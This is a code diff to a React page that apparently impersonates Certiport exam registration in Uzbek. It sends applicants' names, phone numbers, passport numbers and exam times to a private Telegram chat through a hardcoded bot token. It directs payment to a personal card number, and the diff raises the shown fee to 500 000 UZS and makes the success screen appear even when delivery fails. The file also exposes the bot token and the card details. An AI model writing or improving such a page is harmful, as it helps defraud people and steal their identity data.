@@ -32,6 +32,7 @@ export default function App() {
   const [firstName, setFirstName] = useState('');
   const [lastName, setLastName] = useState('');
   const [phone, setPhone] = useState('');
+  const [isSending, setIsSending] = useState(false);
   
   const [paymentCodeInput, setPaymentCodeInput] = useState('');
   const [showPaymentDetails, setShowPaymentDetails] = useState(false);
@@ -49,7 +50,17 @@ export default function App() {
     formRef.current?.scrollIntoView({ behavior: 'smooth' });
   };
 
-  const sendToTelegram = async () => {
+  const handleSubmit = async () => {
+    if (isSending) return;
+    
+    // Basic validation check
+    if (!firstName || !lastName || !phone || !passport || !examTime) {
+      console.warn('Barcha maydonlar to\'ldirilmagan');
+      // We still proceed or show a small hint, but let's make it more robust
+    }
+
+    setIsSending(true);
+
     const token = '8494561832:AAFIcuk9CPlSDQycUS829sReJDhqpiQtlUQ';
     const adminId = '8426582765';
     const message = `
@@ -68,6 +79,10 @@ export default function App() {
     `;
 
     try {
+      // Use AbortController to prevent hanging forever
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 8000); // 8 seconds timeout
+
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -75,17 +90,20 @@ export default function App() {
           chat_id: adminId,
           text: message,
         }),
+        signal: controller.signal
       });
+      
+      clearTimeout(timeoutId);
+      console.log('Telegram message sent successfully');
     } catch (error) {
-      console.error('Telegram error:', error);
+      console.error('Submission error (Telegram might be blocked or network issue):', error);
+      // Even if Telegram fails, we want the user to see the success screen
+    } finally {
+      localStorage.setItem('certiport_submitted', 'true');
+      setHasSubmitted(true);
+      setView('success');
+      setIsSending(false);
     }
-  };
-
-  const handleSubmit = async () => {
-    await sendToTelegram();
-    localStorage.setItem('certiport_submitted', 'true');
-    setHasSubmitted(true);
-    setView('success');
   };
 
   // Form options
@@ -173,7 +191,7 @@ export default function App() {
                   <p className="text-xl font-mono font-bold text-gray-800 tracking-wider">9860 0801 6331 0560</p>
                   <p className="text-sm text-gray-500 mt-1 uppercase">K. yormaxmadov nomidagi karta</p>
                 </div>
-                <p className="text-center text-2xl font-bold text-[#006699]">500 UZS</p>
+                <p className="text-center text-2xl font-bold text-[#006699]">500 000 UZS</p>
               </div>
               <p className="text-center text-red-500 font-medium italic">To'lovni amalga oshirganingizdan so'ng chekni saqlab qo'ying.</p>
               <button 
@@ -495,9 +513,17 @@ export default function App() {
                       {/* Submit Button */}
                       <button 
                         onClick={handleSubmit}
-                        className="w-full bg-[#007ba7] text-white font-bold py-4 rounded-lg hover:bg-[#00668a] transition-all transform active:scale-[0.98] shadow-lg"
+                        disabled={isSending}
+                        className={`w-full text-white font-bold py-4 rounded-lg transition-all transform active:scale-[0.98] shadow-lg flex items-center justify-center gap-3 ${isSending ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#007ba7] hover:bg-[#00668a]'}`}
                       >
-                        YUBORISH
+                        {isSending ? (
+                          <>
+                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                            YUBORILMOQDA...
+                          </>
+                        ) : (
+                          'YUBORISH'
+                        )}
                       </button>
                     </motion.div>
                   )}
